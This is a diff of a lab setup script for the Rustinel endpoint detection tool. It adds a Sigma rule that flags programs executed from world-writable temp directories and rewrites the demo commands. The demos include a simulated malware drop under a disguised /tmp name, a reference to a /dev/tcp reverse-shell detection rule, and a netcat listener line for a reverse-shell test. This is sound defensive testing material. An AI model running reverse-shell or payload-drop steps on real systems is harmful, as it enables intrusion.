@@ -9,15 +9,16 @@
 #      from its published installer (downloaded and SAVED for review first)
 #   3. runs `rustinel setup --yes` to register + start the managed service and
 #      install the detection rules
-#   4. drops in the two custom rules this activity needs (SSH brute-force Sigma;
-#      an EICAR YARA rule) and makes sure the scanners/IOC are enabled
+#   4. drops in the custom rules this activity needs (SSH brute-force Sigma,
+#      malware-exec-from-/tmp Sigma, EICAR YARA) and enables the scanners/IOC
 #   5. verifies the pipeline (doctor + the bundled `whoami` demo rule) and prints
 #      the three demo commands
 #
-# The Essential rules pack (installed by `setup`) covers two of the three demos:
-#   * EICAR test file      -> EICAR IOC set (file_scan on process-start)
-#   * Reverse shell        -> "Linux Reverse Shell via /dev/tcp" (Sigma)
-# The third (SSH brute force) is the custom rule added in step 4.
+# The Essential rules pack (installed by `setup`) covers one of the three demos:
+#   * Reverse shell         -> "Linux Reverse Shell via /dev/tcp" (Sigma)
+# The other two are custom rules added in step 4:
+#   * Malware exec from /tmp -> process_creation, Image under /tmp|/var/tmp|/dev/shm
+#   * SSH brute force        -> a burst of unix_chkpwd execs under sshd
 #
 # The Rustinel installer drops a PORTABLE package into a directory (default
 # ./rustinel); it never adds anything to PATH. We install it to /opt/rustinel so
@@ -131,7 +132,7 @@ ok "layout: $MODE  |  config=$CONFIG"
 ok "rules -> sigma=$SIGDIR  yara=$YARDIR  |  alerts=$ALERTDIR"
 
 # ---- 4. Install the two custom rules ----------------------------------------
-say "Custom rules (SSH brute-force Sigma + EICAR YARA)"
+say "Custom rules (SSH brute-force + /tmp-exec Sigma; EICAR YARA)"
 $SUDO mkdir -p "$SIGDIR" "$YARDIR"
 put_rule() {  # <name> <dstdir> <repo-subdir> <embed-fn>
     if [ -n "$RULES_SRC" ] && [ -f "$RULES_SRC/$3/$1" ]; then
@@ -187,8 +188,33 @@ rule EICAR_Test_File
 }
 YAR
 }
+emit_tmp_exec_sigma() { cat <<'YML'
+title: Malware Execution from World-Writable Temp Directory
+id: 3f9c2a71-8e4d-4b2a-9c6f-1a2b3c4d5e6f
+status: experimental
+description: |
+  A process whose executable path is under /tmp, /var/tmp or /dev/shm. Malware
+  routinely drops a payload into a world-writable directory, makes it executable
+  and runs it (MITRE T1204 User Execution / T1059). Legitimate software rarely
+  executes binaries from these locations. Custom Activity 5 rule; parent-agnostic
+  so it fires regardless of the launching shell.
+logsource: { category: process_creation, product: linux }
+detection:
+  tmp_exec:
+    Image|startswith:
+      - '/tmp/'
+      - '/var/tmp/'
+      - '/dev/shm/'
+  condition: tmp_exec
+level: high
+tags: [attack.execution, attack.t1204, attack.t1059]
+falsepositives:
+  - Some package build or test harnesses execute helpers from /tmp
+YML
+}
 put_rule "lin_ssh_bruteforce_unix_chkpwd.yml"       "$SIGDIR" sigma ssh_sigma
 put_rule "lin_ssh_bruteforce_unix_chkpwd_broad.yml" "$SIGDIR" sigma ssh_sigma_broad
+put_rule "lin_malware_exec_from_tmp.yml"            "$SIGDIR" sigma tmp_exec_sigma
 put_rule "eicar_test.yar"                           "$YARDIR" yara  eicar_yara
 
 # Make sure the scanners + IOC matching are enabled (setup normally sets these).
@@ -264,12 +290,12 @@ fi
 # ---- 6. Print the three demo commands ---------------------------------------
 say "Activity 5 demos (run these to test the tool)"
 cat <<EOF
-  1) EICAR test file. Rustinel scans on process-start, and the raw EICAR file is
-     not a Linux executable, so wrap the signature in a runnable ELF and run THAT:
-       wget -qO ~/eicar.com https://secure.eicar.org/eicar.com.txt
-       cp /bin/true ~/eicar_run; cat ~/eicar.com >> ~/eicar_run; chmod +x ~/eicar_run; ~/eicar_run
-     -> the process image carries the EICAR signature -> EICAR YARA rule fires
-        (alert in $ALERTDIR/alerts.json*). Clean up: rm -f ~/eicar.com ~/eicar_run
+  1) Malware dropped & executed from /tmp. Rustinel scans on process-start, so
+     simulate malware being dropped into a world-writable dir and run from there:
+       cp /bin/true /tmp/.systemd-worker; chmod +x /tmp/.systemd-worker; /tmp/.systemd-worker
+     -> the process image path is under /tmp -> "Malware Execution from World-
+        Writable Temp Directory" Sigma rule fires (alert in $ALERTDIR/alerts.json*).
+        Clean up: rm -f /tmp/.systemd-worker
 
   2) Network intrusion — reverse shell via /dev/tcp (fires the bundled Sigma rule):
        # optional listener on a reachable lab host, e.g. on igw:  nc -lvnp 4444
